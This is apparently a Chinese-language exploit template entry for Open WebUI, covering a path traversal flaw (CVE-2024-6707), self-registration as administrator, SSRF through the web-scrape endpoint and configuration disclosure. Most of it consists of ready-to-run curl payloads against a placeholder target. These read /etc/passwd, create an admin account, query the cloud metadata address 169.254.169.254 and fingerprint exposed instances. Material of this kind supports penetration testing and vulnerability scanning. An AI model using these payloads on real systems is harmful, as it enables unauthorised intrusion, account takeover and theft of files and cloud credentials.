---
id: OPENWEBUI-SSRF
title: Open WebUI 路径穿越与认证绕过漏洞
product: openwebui
vendor: Open WebUI
version_affected: "< 0.3.8"
severity: HIGH
tags: [path_traversal, auth_bypass, ai, llm, 无需认证]
fingerprint: ["Open WebUI", "open-webui", "/api/v1/", "WEBUI_SECRET_KEY"]
---

## 漏洞描述

Open WebUI (原Ollama WebUI) 存在路径穿越漏洞(CVE-2024-6707)和认证绕过(注册时可设为管理员)。

## 影响版本

- Open WebUI < 0.3.8（CVE-2024-6707 路径穿越）
- Open WebUI 所有版本（默认开放注册可设管理员角色）

## 前置条件

- 目标 Open WebUI 服务端口（默认3000或8080）可从网络访问
- CVE-2024-6707: 需已认证用户 Token（可通过注册获取）
- 注册绕过: 目标开启用户注册（默认开启）

## 利用步骤

### CVE-2024-6707: 路径穿越

通过API端点可实现任意文件读取:
```http
GET /api/v1/files/../../../etc/passwd HTTP/1.1
Authorization: Bearer <token>
```

### 注册绕过获取管理员

如果开放注册(默认开启):
```http
POST /api/v1/auths/signup HTTP/1.1
Content-Type: application/json

{"name":"admin","email":"hacker@test.com","password":"password123","role":"admin"}
```

### 默认配置泄露

```bash
curl http://target/api/v1/configs/
curl http://target/api/v1/models/
```

## Payload

### 注册管理员账户

```bash
curl -s -X POST http://target:8080/api/v1/auths/signup \
  -H "Content-Type: application/json" \
  -d '{"name":"admin","email":"hacker@test.com","password":"password123","role":"admin"}'
```

### 路径穿越文件读取（需认证）

```bash
TOKEN="<从注册或登录获取的token>"
curl -s http://target:8080/api/v1/files/../../../etc/passwd \
  -H "Authorization: Bearer $TOKEN"
```

### SSRF（通过 URL 抓取功能）

```bash
curl -s -X POST http://target:8080/api/v1/utils/web/scrape \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'
```

### 配置信息泄露

```bash
curl -s http://target:8080/api/v1/configs/
curl -s http://target:8080/api/v1/models/
```

## 验证方法

```bash
# 1. 确认注册开放且可提升为管理员：返回 token 即存在漏洞
curl -s -X POST http://target:8080/api/v1/auths/signup \
  -H "Content-Type: application/json" \
  -d '{"name":"testuser","email":"test@test.com","password":"Test12345","role":"admin"}' \
  | grep '"token"'

# 2. 路径穿越验证：返回文件内容即可利用
curl -s "http://target:8080/api/v1/files/../../../etc/passwd" \
  -H "Authorization: Bearer $TOKEN" | grep "root:"

# 3. SSRF 验证：返回内部服务响应
curl -s -X POST http://target:8080/api/v1/utils/web/scrape \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}' \
  | grep -v '"error"'
```

## 指纹确认

```bash
curl -s http://target/ | grep -i "open webui\|open-webui"
curl -s http://target/api/v1/auths/
```
